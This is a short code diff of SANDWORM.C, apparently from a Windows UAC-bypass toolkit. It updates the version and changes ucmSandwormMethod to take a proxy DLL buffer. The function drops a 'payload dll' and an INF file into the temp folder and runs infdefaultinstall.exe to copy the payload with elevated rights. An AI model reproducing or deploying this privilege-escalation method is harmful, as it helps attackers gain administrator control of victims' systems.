@@ -4,9 +4,9 @@
 *
 *  TITLE:       SANDWORM.C
 *
-*  VERSION:     2.58
+*  VERSION:     2.70
 *
-*  DATE:        13 Mar 2017
+*  DATE:        25 Mar 2017
 *
 *  Sandworm method.
 *
@@ -82,7 +82,8 @@ static const unsigned char g_SandwormInf[319] = {
 *
 */
 BOOL ucmSandwormMethod(
-    VOID
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE;
@@ -98,15 +99,15 @@ BOOL ucmSandwormMethod(
     //
     _strcpy(szPayloadDll, g_ctx.szTempDirectory);
     _strcat(szPayloadDll, NTWDBLIB_DLL);
-    if (supWriteBufferToFile(szPayloadDll, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
-        
+    if (supWriteBufferToFile(szPayloadDll, ProxyDll, ProxyDllSize)) {
+
         //
         // Write installation inf to the disk.
         //
         _strcpy(szInstallInf, g_ctx.szTempDirectory);
         _strcat(szInstallInf, PACKAGE_INF);
         if (supWriteBufferToFile(szInstallInf, (PVOID)g_SandwormInf, sizeof(g_SandwormInf))) {
-            
+
             //
             // Run infdefaultinstall.exe to copy our payload dll.
             //
